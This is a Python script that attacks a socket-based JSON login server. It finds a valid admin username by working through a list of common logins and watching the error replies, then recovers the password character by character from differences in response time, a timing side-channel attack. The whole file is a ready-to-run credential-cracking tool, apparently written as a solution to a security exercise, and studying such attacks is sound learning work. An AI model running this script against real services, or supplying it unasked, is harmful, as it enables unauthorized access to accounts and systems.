from datetime import datetime
from json import loads
from json import dumps
from socket import socket
from string import ascii_letters
from string import digits
from sys import argv

SUCCESS = 'Connection success!'
EXCEPTION_DURING_LOGIN = 'Exception happened during login'
WRONG_PASSWORD = 'Wrong password!'


def login_generator(filename='logins.txt'):
    """login_generator() --> Yields typical admin logins fetched from file
    Parameters:
    filename:   name of file with admin logins. Defaults to 'logins.txt'
    """
    with open(filename, 'rt') as f:
        for s in f:
            s = s.strip()
            yield s


def get_server_response(msg_dict):
    """get_server_response(msg_dict) --> Returns a dictionary with login result
    loaded from json response from the server
    Parameters:
    msg_dict:   dictionary with login & password for json body of socket request
    """
    json_msg = dumps(msg_dict)
    client_socket.send(json_msg.encode())
    json_response = client_socket.recv(1024).decode()
    return loads(json_response)


# reading cli arguments
args = argv
if len(args) != 3:
    print('The script should be called with two arguments: hostname & port')
    exit(1)
host, port = argv[1:]
address = (host, int(port))

# creating socket, sending server requests and parsing responses
response = {}
with socket() as client_socket:
    client_socket.connect(address)

    # identifying login
    login = blank_password = ' '
    for login_guess in login_generator():
        msg = {'login': login_guess, 'password': blank_password}
        response = get_server_response(msg)
        if response['result'] == WRONG_PASSWORD:
            login = login_guess
            break

    # identifying password
    pwd_root = ''
    chars = ascii_letters + digits
    while response['result'] != SUCCESS:
        delay_dict = {}
        for char in chars:
            password_guess = pwd_root + char
            msg = {'login': login, 'password': password_guess}
            start_time = datetime.now()
            response = get_server_response(msg)
            end_time = datetime.now()
            diff_period = end_time - start_time
            delay_dict[char] = diff_period
            if response['result'] == SUCCESS:
                break
        else:
            pwd_root += max(delay_dict, key=delay_dict.get)

    print(dumps(msg))
